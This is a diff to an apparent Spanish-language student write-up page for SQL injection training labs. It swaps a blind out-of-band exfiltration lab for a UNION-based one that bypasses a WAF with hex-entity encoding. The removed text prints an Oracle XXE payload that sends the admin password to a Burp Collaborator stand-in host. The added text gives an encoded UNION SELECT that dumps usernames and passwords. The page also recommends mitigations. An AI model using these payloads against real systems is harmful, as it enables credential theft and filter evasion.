@@ -50,7 +50,7 @@
 
   <div class="lab-card desarrollo">
 
-      <h2>Lab 14 - Blind SQL injection with out-of-band data exfiltration</h2>
+      <h2>Lab 15 - SQL injection with filter bypass via XML encoding </h2>
 
     <h3>Nivel</h3>
     <p>
@@ -59,58 +59,60 @@
       
       <h3>Tipo de SQLi</h3>
     <p>
-        Blind SQL injection (Out-of-band / OAST) con Exfiltración de Datos: Inyección SQL a ciegas que utiliza técnicas fuera de banda para extraer información sensible y enviarla a un servidor externo controlado por el atacante.  
+        UNION based SQLi con evasión de WAF/filtros mediante ofuscación.   
     </p>
 
       <h3>Objetivo</h3>
     <p style="text-align:justify";>
-        Explotar una vulnerabilidad de inyección SQL en la cookie de rastreo para extraer la contraseña del usuario mediante una consulta DNS al servidor de Burp Collaborator, y posteriormente iniciar sesión con dicha credencial.   
+        Explotar una vulnerabilidad de inyección SQL en la función de "Stock Check" para recuperar las credenciales del usuario administrador de la tabla users y posteriormente iniciar sesión en su cuenta.    
     </p>
 
       <h3>Explicación técnica de la vulnerabilidad</h3>
     <p style="text-align:justify";>
-        El motor de la base de datos Oracle permite concatenar resultados de subconsultas SQL dentro de una solicitud de red externa.
+        La aplicación web utiliza una interfaz XML para enviar datos al servidor, el servidor no asegura bien los datos contenidos dentro de las etiquetas XML antes de incluirlos en una consulta SQL.
+Además la web cuenta con un WAF (Web Application Firewall) que es un filtro que detecta palabras clave de SQL. Al codificar el payload en Hex Entities, el WAF no reconoce el ataque, pero el servidor web decodifica el XML antes de procesar la consulta, permitiendo que el payload malicioso se ejecute en la base de datos.
 
-La vulnerabilidad permite inyectar un comando que realiza una búsqueda de la contraseña en la tabla users y coloca ese valor como un subdominio en una petición DNS dirigida a Burp Collaborator. De esta forma, el atacante no necesita ver la respuesta en la web; solo necesita revisar los registros de su servidor DNS para leer la contraseña filtrada.   
     </p>
 
     <h3>Procedimiento paso a paso</h3>
     <ul>
-      <li><strong>Captura de petición:</strong> Interceptar la solicitud inicial en Burp Suite, identificar la cookie <code>TrackingId</code> y enviarla a Repeater.</li>
-      <li><strong>Activar Collaborator:</strong> Abrir Burp Collaborator Client y copiar el dominio único generado.</li>
-      <li><strong>Construir payload:</strong> Crear una consulta Oracle que obtenga la contraseña del usuario <code>administrator</code> y la envíe al dominio del Collaborator.</li>
-      <li><strong>Inyectar payload:</strong> Reemplazar el valor de <code>TrackingId</code> con el payload y aplicar <em>URL Encoding</em> (Ctrl+U).</li>
-      <li><strong>Recibir datos:</strong> Enviar la petición y revisar Burp Collaborator con <em>Poll now</em> para observar solicitudes DNS que contienen la contraseña.</li>
-      <li><strong>Acceso final:</strong> Usar la contraseña obtenida para iniciar sesión como <code>administrator</code> en la sección <em>My account</em>.</li>
+      <li><strong>Configurar entorno:</strong> Instalar la extensión <em>Hackvertor</em> desde el BApp Store de Burp Suite para poder ofuscar payloads.</li>
+      <li><strong>Interceptar petición:</strong> Capturar la solicitud <code>POST</code> de la función <em>Check stock</em> y enviarla a Repeater para analizar el XML.</li>
+      <li><strong>Detectar filtro:</strong> Insertar el payload <code>1 UNION SELECT NULL</code> en la etiqueta <code>&lt;storeId&gt;</code>. El mensaje <em>"Attack detected"</em> confirma la presencia de un filtro/WAF.</li>
+      <li><strong>Bypass del filtro:</strong> Usar el tag <code>@hex_entities</code> de Hackvertor para codificar el payload y evitar que el WAF detecte palabras clave SQL.</li>
+      <li><strong>Extraer credenciales:</strong> Ejecutar el payload codificado <code>1 UNION SELECT username || '~' || password FROM users</code> para obtener usuarios y contraseñas.</li>
+      <li><strong>Acceso final:</strong> Iniciar sesión en <em>My account</em> con las credenciales del usuario <code>administrator</code> para completar el laboratorio.</li>
     </ul>
     
       <div class="lab-card multimedia">
           <h3>Evidencia</h3>
     <p>Request interceptado</p>
-    <img src="img/lab14_1.png" alt="evidencia">
+    <img src="img/lab15_1.png" alt="evidencia">
       <p>Payload utilizado</p>
-    <img src="img/lab14_2.png" alt="evidencia">
+    <img src="img/lab15_2.png" alt="evidencia">
           <p>Respuesta vulnerable</p>
-          <img src="img/lab14_3.png" alt="evidencia">
+          <img src="img/lab15_3.png" alt="evidencia">
       <p>Confirmación</p>
-    <img src="img/lab14_4.png" alt="evidencia">
+    <img src="img/lab15_4.png" alt="evidencia">
       </div>
 
       <h3>Explicación de payload</h3>
         <p style="text-align:justify";>
-            TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+            El payload utilizado es: 
+<@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>
 
-EXTRACTVALUE / xmltype: Funciones de Oracle que procesan XML. Se utilizan para forzar a la base de datos a realizar una conexión externa de red.
+1 UNION SELECT: Combina la consulta legítima con una personalizada para extraer datos adicionales.
 
-Concatenación dinámica (||): Une el resultado de la consulta de password con el subdominio de Burp Collaborator.
+username || '~' || password: Concatena el usuario y la clave en una sola columna separados por “~” para que la base de datos los entregue juntos, respetando el número de columnas originales.
 
-Exfiltración vía DNS/HTTP: Al intentar resolver la URL, la base de datos envía involuntariamente la contraseña del administrador hacia el servidor del atacante.
-  
+FROM users: Especifica la tabla de donde se extrae la información sensible.
+
+hex_entities: Codifica el texto en formato hexadecimal, permitiendo que pase a través del WAF sin ser detectado como una amenaza SQL.
         </p>
 
       <h3>Mitigación recomendada</h3>
       <p style="text-align:justify";>
-          Lo más recomendado es el uso de consultas parametrizadas, que aseguran que el valor de las cookies se trate exclusivamente como datos y no como código SQL ejecutable. Además, se debe reforzar la seguridad de red restringiendo las conexiones salientes desde el servidor de la base de datos, impidiendo que el motor pueda realizar peticiones DNS o HTTP hacia servidores externos no autorizados para exfiltrar información.   
+          La solución principal es el uso de consultas parametrizadas, que impiden que el motor de la base de datos interprete los datos del usuario como comandos SQL. Además debe agregar una validación de esquemas XML en el servidor y la configuración de filtros de red, los cuales bloquean cualquier intento de la base de datos de realizar conexiones hacia servidores externos no autorizados, impidiendo así la exfiltración de datos.  
       </p>
 
   </div>
